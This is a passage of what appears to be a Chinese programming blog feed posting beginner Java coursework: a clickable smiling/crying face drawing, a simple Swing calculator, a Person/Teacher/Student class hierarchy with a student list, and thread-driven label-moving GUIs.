class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mouseClicked</span><span class="params">(MouseEvent e)</span> </span>&#123;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>) &#123;b=<span class="keyword">false</span>; repaint();&#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;b=<span class="keyword">true</span>; repaint();&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.paint(g);</span><br><span class="line">        <span class="keyword">if</span>(b) &#123;</span><br><span class="line">            g.setColor(Color.blue);</span><br><span class="line">            g.drawOval(<span class="number">150</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">200</span>);</span><br><span class="line">            g.drawArc(<span class="number">180</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">250</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">200</span>, <span class="number">200</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawString(<span class="string">"笑"</span>, <span class="number">50</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            g.setColor(Color.blue);</span><br><span class="line">            g.drawOval(<span class="number">150</span>, <span class="number">50</span>, <span class="number">150</span>, <span class="number">200</span>);</span><br><span class="line">            g.drawArc(<span class="number">180</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">250</span>, <span class="number">85</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">180</span>, <span class="number">180</span>);</span><br><span class="line">            g.drawArc(<span class="number">200</span>, <span class="number">200</span>, <span class="number">40</span>, <span class="number">30</span>, <span class="number">180</span>, -<span class="number">180</span>);</span><br><span class="line">            g.drawString(<span class="string">"哭"</span>, <span class="number">50</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">new</span> FaceChange();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/7I5PZNx.png" alt=""><br><img src="https://i.imgur.com/mrIygEp.png" alt=""></p><h1 id="GUI-计算器"><a href="#GUI-计算器" class="headerlink" title="GUI-计算器"></a>GUI-计算器</h1><p>实现了监听类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calculator</span> <span class="keyword">extends</span> <span class="title">JFrame</span>  </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH = <span class="number">400</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT =<span class="number">200</span>;</span><br><span class="line">    JButton[] buttons = <span class="keyword">new</span> JButton[<span class="number">4</span>];</span><br><span class="line">    TextField tf1,tf2,tf3;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calculator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setTitle(<span class="string">"计算器"</span>);</span><br><span class="line">        setLayout(<span class="keyword">new</span> GridLayout(<span class="number">4</span>, <span class="number">1</span>));</span><br><span class="line">        String[] caculate = &#123;<span class="string">"+"</span>, <span class="string">"-"</span>, <span class="string">"*"</span>, <span class="string">"/"</span>&#125;;</span><br><span class="line">        JPanel panel = <span class="keyword">new</span> JPanel();</span><br><span class="line">        panel.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">1</span>,<span class="number">4</span>));</span><br><span class="line">        MyListener ml=<span class="keyword">new</span> MyListener();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            buttons[i] = <span class="keyword">new</span> JButton(caculate[i]);</span><br><span class="line">            buttons[i].addActionListener(ml);</span><br><span class="line">            panel.add(buttons[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        tf1 = <span class="keyword">new</span> TextField();</span><br><span class="line">        tf2 = <span class="keyword">new</span> TextField();</span><br><span class="line">        tf3 = <span class="keyword">new</span> TextField();</span><br><span class="line">        add(tf1);</span><br><span class="line">        add(tf2);</span><br><span class="line">        add(panel);</span><br><span class="line">        add(tf3);</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLocation(<span class="number">300</span>, <span class="number">300</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">double</span> a,b,result;</span><br><span class="line">            String bname=e.getActionCommand();</span><br><span class="line">            a=Double.parseDouble(tf1.getText());</span><br><span class="line">            b=Double.parseDouble(tf2.getText());</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"+"</span>))&#123;</span><br><span class="line">                result=a+b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"-"</span>))&#123;</span><br><span class="line">                result=a-b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"*"</span>))&#123;</span><br><span class="line">                result=a*b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(bname.equals(<span class="string">"/"</span>))&#123;</span><br><span class="line">                result=a/b;</span><br><span class="line">                tf3.setText(result+<span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Calculator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/29KIyPK.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类编程&quot;&gt;&lt;a href=&quot;#类编程&quot; class=&quot;headerlink&quot; title=&quot;类编程&quot;&gt;&lt;/a&gt;类编程&lt;/h1&gt;&lt;p&gt;  类Person:&lt;br&gt;          属性：编号、姓名、性别；&lt;br&gt;          构造方法：确定编号和姓名；&lt;br
      
    
    </summary>
    
      <category term="java" scheme="http://yoursite.com/categories/java/"/>
    
    
      <category term="java" scheme="http://yoursite.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java_code</title>
    <link href="http://yoursite.com/2019/01/03/java%E7%BC%96%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/01/03/java编程/</id>
    <published>2019-01-02T16:00:00.000Z</published>
    <updated>2019-01-08T12:51:39.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类编程"><a href="#类编程" class="headerlink" title="类编程"></a>类编程</h1><p>类Person:<br>          属性：编号、姓名、性别；<br>          构造方法：确定编号和姓名；<br>          一般方法：修改编号、姓名，获取编号、姓名。<br>      类Teacher：继承类Person并增加：<br>          属性：系别；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取系别。<br>      类Student：继承类Person并增加：<br>          属性：班级；<br>          构造方法：调用父类的构造方法；<br>          一般方法：修改、获取班级属性值。<br>      类Classes：<br>          属性：班级名称，学生名单(Student类对象的数组)；<br>          构造方法：确定班级名称；<br>          一般方法：建立学生名单，输出学生名单。<br>      类Main：<br>主类。主方法中创建一个班级，然后建立该班级的学生名单，最后<br>输出学生名单。     </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id,name,sex;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String id,String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_id</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id=id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_name</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_id</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_name</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Teacher</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String department;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Teacher</span><span class="params">(String id,String name,String department)</span></span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(id,name);</span><br><span class="line">        <span class="keyword">this</span>.department=department;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set_department</span><span class="params">(String department)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.department=department;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">get_department</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String s_class;</span><br><span class="line"></span><br><span class="line">    Student(String  id,String name)&#123;</span><br><span class="line">        <span class="keyword">super</span>(id,name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setS_class</span><span class="params">(String s_class)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.s_class=s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getS_class</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Classes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String s_class;</span><br><span class="line">    Student[] students=<span class="keyword">new</span>  Student[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    Classes(String s_class)&#123;</span><br><span class="line">       <span class="keyword">this</span>.s_class=s_class;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setS_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"输入学生人数"</span>);</span><br><span class="line">        Scanner sc= <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        num=sc.nextInt();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"输入学号，姓名"</span>);</span><br><span class="line">            students[i]=<span class="keyword">new</span> Student(sc.next(),sc.next());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">outS_list</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"班级:"</span>+s_class);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">"ID:"</span>+students[i].get_id()+<span class="string">" "</span>+<span class="string">"姓名:"</span>+students[i].get_name());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line">        Classes classes = <span class="keyword">new</span> Classes(<span class="string">"信安"</span>);</span><br><span class="line">        classes.setS_list();</span><br><span class="line">        classes.outS_list();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="GUI-多线程-右下移动"><a href="#GUI-多线程-右下移动" class="headerlink" title="GUI+多线程-右下移动"></a>GUI+多线程-右下移动</h1><p>编写两个线程，一个线程可以让标签1向右移动，另一个线程可以让标签2向下移动。主界面上设置一个按钮，可以用来启动上述线程。</p><p>这里为了更好的学习多线程，实现了两种不同的线程。</p><p>使用Thread类实现多线程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJFrame2</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH=<span class="number">300</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT=<span class="number">200</span>;</span><br><span class="line">    JButton button;</span><br><span class="line">    JLabel label1,label2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyJFrame2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        setTitle(<span class="string">"标签移动"</span>);</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLocation(<span class="number">300</span>, <span class="number">200</span>);</span><br><span class="line">        setLayout(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">        button = <span class="keyword">new</span> JButton(<span class="string">"启动线程"</span>);</span><br><span class="line">        label1 = <span class="keyword">new</span> JLabel(<span class="string">"标签1"</span>);</span><br><span class="line">        label2 = <span class="keyword">new</span> JLabel(<span class="string">"标签2"</span>);</span><br><span class="line">        add(button);</span><br><span class="line">        add(label1);</span><br><span class="line">        add(label2);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        button.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                    MyThread1 thread1 = <span class="keyword">new</span> MyThread1(label1);</span><br><span class="line">                    thread1.start();</span><br><span class="line">                    MyThread1 thread2 = <span class="keyword">new</span> MyThread1(label2);</span><br><span class="line">                    thread2.start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyThread1</span> <span class="keyword">extends</span> <span class="title">Thread</span></span>&#123;</span><br><span class="line">        JLabel label;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MyThread1</span><span class="params">(JLabel label)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.label=label;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span>(label==label1) &#123;</span><br><span class="line">                            label1.setLocation(label1.getX() + <span class="number">10</span>, label1.getY());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(label==label2) &#123;</span><br><span class="line">                            label2.setLocation(label2.getX(), label2.getY() + <span class="number">10</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                         Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> MyJFrame2();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/S31q0MR.png" alt=""></p><p>实现Runnable接口的类的作为参数创建Thread类对象，重载run()方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread thread1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1(label1));</span><br><span class="line">thread1.start();</span><br><span class="line">Thread thread2 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread1(label2));</span><br><span class="line">thread2.start();</span><br></pre></td></tr></table></figure></p><h1 id="GUI-多线程-左右移动"><a href="#GUI-多线程-左右移动" class="headerlink" title="GUI+多线程-左右移动"></a>GUI+多线程-左右移动</h1><p>编写一个图形用户界面程序，窗体的宽度300，高度150，布局管理器为null，窗体上有二个标签和二个按钮，标签的位置为（10,30）和（200,60），按钮的位置为（50,100）和（150,100），它们的宽度和高度都是80和20。编写一个线程，该线程可以让标签向右或向左移动10次，每次移动10个单位，间隔1秒，通过按钮的动作事件启动上述线程，“向右走”按钮启动“向右移标签”，“向左走”按钮启动“向左移标签”，界面如下图所示。</p><p>run方法是自动调用的<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Move</span> <span class="keyword">extends</span> <span class="title">JFrame</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> WIDTH=<span class="number">300</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> HEIGHT=<span class="number">200</span>;</span><br><span class="line">    JButton button1,button2;</span><br><span class="line">    JLabel lb1,lb2;</span><br><span class="line">    <span class="keyword">boolean</span> flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Move</span><span class="params">()</span></span>&#123;</span><br><span class="line">        setSize(WIDTH, HEIGHT);</span><br><span class="line">        setLayout(<span class="keyword">null</span>);</span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">        setDefaultCloseOperation(EXIT_ON_CLOSE);</span><br><span class="line">        lb1=<span class="keyword">new</span> JLabel(<span class="string">"向右移标签"</span>);</span><br><span class="line">        lb2=<span class="keyword">new</span> JLabel(<span class="string">"向左移标签"</span>);</span><br><span class="line">        button1=<span class="keyword">new</span> JButton(<span class="string">"向右走"</span>);</span><br><span class="line">        button2=<span class="keyword">new</span> JButton(<span class="string">"向左走"</span>);</span><br><span class="line">        lb1.setBounds(<span class="number">10</span>,<span class="number">30</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        lb2.setBounds(<span class="number">200</span>,<span class="number">60</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        button1.setBounds(<span class="number">50</span>,<span class="number">100</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        button2.setBounds(<span class="number">150</span>,<span class="number">100</span>,<span class="number">80</span>,<span class="number">20</span>);</span><br><span class="line">        add(lb1);</span><br><span class="line">        add(lb2);</span><br><span class="line">        add(button1);</span><br><span class="line">        add(button2);</span><br><span class="line">        MyListener ml=<span class="keyword">new</span> MyListener();</span><br><span class="line">        button1.addActionListener(ml);</span><br><span class="line">        button2.addActionListener(ml);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyListener</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(e.getSource()==button1)&#123;</span><br><span class="line">                    Thread t1=<span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread());</span><br><span class="line">                    flag=<span class="keyword">true</span>;</span><br><span class="line">                    t1.start();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(e.getSource()==button2)&#123;</span><br><span class="line">                Thread t2=<span class="keyword">new</span> Thread(<span class="keyword">new</span> MyThread());</span><br><span class="line">                flag=<span class="keyword">false</span>;</span><br><span class="line">                t2.start();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">                <span 